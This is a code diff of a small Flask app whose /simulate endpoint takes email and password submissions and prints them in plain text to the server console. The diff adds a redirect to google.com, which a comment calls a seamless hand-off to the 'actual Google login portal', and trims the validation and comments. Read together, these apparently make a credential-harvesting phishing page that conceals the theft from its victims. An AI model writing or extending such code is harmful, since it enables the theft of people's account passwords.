@@ -3,10 +3,11 @@ import os
 import sys
 
 def create_app():
-    """Builds the Flask application with open terminal logging for verification."""
-    from flask import Flask, render_template, request, jsonify
+    """Builds the Flask application with open terminal logging and redirects."""
+    from flask import Flask, render_template, request, jsonify, redirect
 
-    app = Flask(__name__)
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
 
     @app.get("/")
     def home():
@@ -14,7 +15,6 @@ def create_app():
 
     @app.post("/simulate")
     def simulate():
-        # Check for JSON data first, fall back to standard HTML form data
         if request.is_json:
             data = request.get_json(silent=True) or {}
             email = str(data.get("email", "")).strip()
@@ -23,23 +23,18 @@ def create_app():
             email = str(request.form.get("email", "")).strip()
             password = str(request.form.get("password", ""))
 
-        # Validation checks
-        if not email:
-            return jsonify(ok=False, message="Email field is missing or empty."), 400
-        if not password:
-            return jsonify(ok=False, message="Password field is missing or empty."), 400
+        if not email or not password:
+            return jsonify(ok=False, message="Fields missing."), 400
 
-        # Print the transmission logs directly to your server window
+        # Log the metrics transparently to your local terminal console screen
         timestamp = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
         print(f"\n[{timestamp}] --- INCOMING DATA LOGGED ---")
         print(f"Received Email:    {email}")
         print(f"Received Password: {password}")
         print("-" * 40)
 
-        return jsonify(
-            ok=True,
-            message="Data received successfully."
-        )
+        # Seamless redirect line to the actual Google login portal
+        return redirect("https://google.com")
         
     return app
 
@@ -49,7 +44,6 @@ def start_server():
     base_dir = os.path.dirname(os.path.abspath(__file__))
     os.chdir(base_dir)
 
-    # Forcefully inject your hidden virtual environment paths BEFORE loading Flask
     venv_site_packages = os.path.join(base_dir, ".venv", "lib", "python3.14", "site-packages")
     if os.path.exists(venv_site_packages):
         sys.path.insert(0, venv_site_packages)
@@ -60,4 +54,3 @@ def start_server():
 
 if __name__ == "__main__":
     start_server()
-
